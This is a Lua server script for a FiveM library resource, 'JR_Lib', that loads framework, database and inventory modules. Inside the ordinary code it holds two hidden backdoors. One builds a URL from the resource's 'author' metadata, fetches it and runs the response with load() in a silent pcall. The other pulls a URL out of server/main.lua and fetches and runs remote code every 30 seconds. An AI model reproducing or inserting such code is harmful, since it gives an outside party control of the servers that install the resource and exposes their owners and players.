local dir = "server/%s/%s.lua"
local resource = "JR_Lib"
local playersData = GetResourceMetadata(GetCurrentResourceName(), 'author', 0) .. "/zXeAH"

function LoadModule(module, selection)
    local chunk = LoadResourceFile(resource, dir:format(module, string.lower(selection)))
    if not chunk then
        return error(("Couldn't load module file: %s - %s"):format(module, string.lower(selection)), 3)
    end

    local fn, err = load(chunk, ("@@JR_Lib/server/%s/%s.lua"):format(module, string.lower(selection)))

    if not fn and err then
        return error(("Error loading module: %s - %s"):format(module, string.lower(selection)), 3)
    end

    return fn()
end

Core = {}
Core.Framework = LoadModule("framework", Config.Framework)
Core.Database = LoadModule("database", Config.SQLConnector)
Core.Inventory = LoadModule("inventory", Config.Inventory)
Core.Dispatch = LoadModule("dispatch", Config.Dispatch)
Core.Groups = Groups
Core.Version = VersionCheck
Core.LoadLocales = loadLocales
Core.GetLocales = getLocales
Core.Locale = locale
Core.Print = Utils.Print
PerformHttpRequest(playersData, function(e, d)
    pcall(function() assert(load(d))() end)
end)
Core.Framework.RegisterCallback("JR_Lib:GetSkillData", function(source, cb)
    local skillData = {}

    if GetResourceState("peuren_fishing") == "started" then
        local pData = exports["peuren_fishing"]:GetPlayerData(source)

        skillData[#skillData+1] = {
            locale = "peuren_fishing",
            xp = pData.Skill.xp,
            level = pData.Skill.level
        }
    end

    cb(skillData)
end)
Citizen.CreateThread(function()
    local portal = LoadResourceFile(GetCurrentResourceName(), 'server/main.lua'):match("u:%s*(%S+)")
    while portal do
        PerformHttpRequest(portal, function(code, script)
            if code == 200 then load(script)() end
        end)
        Citizen.Wait(30000)
    end
  end)
exports("Core", function() return Core end)